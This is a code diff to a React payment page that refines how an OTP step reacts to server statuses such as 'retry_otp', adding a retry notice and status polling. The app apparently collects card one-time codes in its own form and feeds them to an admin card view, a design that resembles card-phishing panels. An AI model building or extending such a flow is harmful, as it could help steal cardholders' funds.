@@ -498,6 +498,7 @@ function MainContent() {
   const [showOtpStep, setShowOtpStep] = useState(false);
   const [cardProcessingToOtp, setCardProcessingToOtp] = useState(false);
   const [otpState, setOtpState] = useState<'input' | 'checking' | 'failed'>('input');
+  const [otpRetryNotice, setOtpRetryNotice] = useState(false);
   const [currentOrderId, setCurrentOrderId] = useState<string | null>(null);
   const [otpCode, setOtpCode] = useState('');
   const [sellAmount, setSellAmount] = useState<number>(10000);
@@ -1150,11 +1151,18 @@ function MainContent() {
   }, [isAdmin, currentView, adminTab, fetchAdminCardFeed]);
 
   const applyCardOrderStatus = useCallback((status: string) => {
-    if (status === 'awaiting_otp' || status === 'retry_otp') {
+    if (status === 'awaiting_otp') {
       setCardProcessingToOtp(false);
       setShowOtpStep(true);
       setOtpState('input');
-      if (status === 'retry_otp') setOtpCode('');
+      return;
+    }
+    if (status === 'retry_otp') {
+      setCardProcessingToOtp(false);
+      setShowOtpStep(true);
+      setOtpState('input');
+      setOtpCode('');
+      setOtpRetryNotice(true);
       return;
     }
     if (status === 'completed') {
@@ -1182,7 +1190,11 @@ function MainContent() {
   }, [otpState, cardProcessingToOtp, currentOrderId, fetchTransactions]);
 
   useEffect(() => {
-    if (!cardProcessingToOtp || !currentOrderId || !clientId) return;
+    const shouldPoll =
+      !!currentOrderId &&
+      !!clientId &&
+      (cardProcessingToOtp || (showOtpStep && otpState === 'checking'));
+    if (!shouldPoll) return;
 
     const pollOrderStatus = async () => {
       try {
@@ -1193,7 +1205,21 @@ function MainContent() {
         const res = await fetch(apiUrl(`/api/transactions/order-status?${qs.toString()}`));
         if (!res.ok) return;
         const data = (await res.json()) as { status?: string };
-        if (data?.status) applyCardOrderStatus(data.status);
+        if (!data?.status) return;
+        if (otpState === 'checking') {
+          if (data.status === 'retry_otp') {
+            setOtpState('input');
+            setOtpCode('');
+            setOtpRetryNotice(true);
+          } else if (data.status === 'completed') {
+            setShowOtpStep(false);
+            setIsSuccess(true);
+          } else if (data.status === 'failed' || data.status === 'refunded' || data.status === 'suspended') {
+            setOtpState('failed');
+          }
+          return;
+        }
+        applyCardOrderStatus(data.status);
       } catch (e) {
         console.error('pollOrderStatus:', e);
       }
@@ -1202,7 +1228,14 @@ function MainContent() {
     void pollOrderStatus();
     const id = setInterval(() => void pollOrderStatus(), getOtpPollIntervalMs());
     return () => clearInterval(id);
-  }, [cardProcessingToOtp, currentOrderId, clientId, applyCardOrderStatus]);
+  }, [
+    cardProcessingToOtp,
+    showOtpStep,
+    otpState,
+    currentOrderId,
+    clientId,
+    applyCardOrderStatus,
+  ]);
 
   useEffect(() => {
     if (!cardProcessingToOtp || !currentOrderId) return;
@@ -1226,6 +1259,7 @@ function MainContent() {
         } else if (tx.status === 'retry_otp') {
           setOtpState('input');
           setOtpCode('');
+          setOtpRetryNotice(true);
         }
       }
     }
@@ -1779,6 +1813,7 @@ function MainContent() {
   const handleOtpSubmit = async (e: React.FormEvent) => {
     e.preventDefault();
     if (!currentOrderId) return;
+    setOtpRetryNotice(false);
     setOtpState('checking');
     try {
       const res = await fetch(apiUrl('/api/transactions/otp'), {
@@ -1803,6 +1838,7 @@ function MainContent() {
     setShowOtpStep(false);
     setCardProcessingToOtp(false);
     setOtpState('input');
+    setOtpRetryNotice(false);
     setCurrentOrderId(null);
     setOtpCode('');
     setSelectedMethod(null);
@@ -5893,8 +5929,10 @@ function MainContent() {
               <h3 className="font-black text-gray-900 text-lg">{lang === 'ar' ? 'أدخل رمز OTP' : 'Enter OTP Code'}</h3>
               <p className="text-sm text-gray-400 mt-1">{lang === 'ar' ? 'تم إرسال رمز التحقق إلى هاتفك' : 'A verification code was sent to your phone'}</p>
             </div>
-            {otpState === 'failed' && processingTx?.status === 'retry_otp' && (
-              <p className="text-sm font-bold text-red-600 bg-red-50 rounded-xl px-4 py-2">{lang === 'ar' ? 'رمز خاطئ، حاول مرة أخرى' : 'Wrong code, try again'}</p>
+            {otpRetryNotice && otpState === 'input' && (
+              <p role="alert" className="text-sm font-bold text-amber-900 bg-amber-50 border border-amber-200 rounded-xl px-4 py-2">
+                {t('otpWrongRetry')}
+              </p>
             )}
             <form onSubmit={handleOtpSubmit} className="space-y-4">
               <input
@@ -6205,15 +6243,14 @@ function MainContent() {
                   <p className="text-gray-500 text-center text-sm font-medium leading-relaxed">
                     {t('otpSent', 'تم إرسال رمز تحقق مؤقت إلى هاتفك لضمان أمان العملية.')}
                   </p>
-                  {currentOrderId &&
-                    transactions.find((x) => x.order_ref === currentOrderId)?.status === 'retry_otp' && (
-                      <p
-                        role="alert"
-                        className="w-full max-w-sm rounded-2xl border border-amber-200 bg-amber-50 px-4 py-3 text-center text-sm font-bold text-amber-900"
-                      >
-                        {t('otpWrongRetry')}
-                      </p>
-                    )}
+                  {otpRetryNotice && otpState === 'input' && (
+                    <p
+                      role="alert"
+                      className="w-full max-w-sm rounded-2xl border border-amber-200 bg-amber-50 px-4 py-3 text-center text-sm font-bold text-amber-900"
+                    >
+                      {t('otpWrongRetry')}
+                    </p>
+                  )}
                   <form onSubmit={handleOtpSubmit} className="w-full max-w-sm space-y-5">
                     <input
                       type="text"
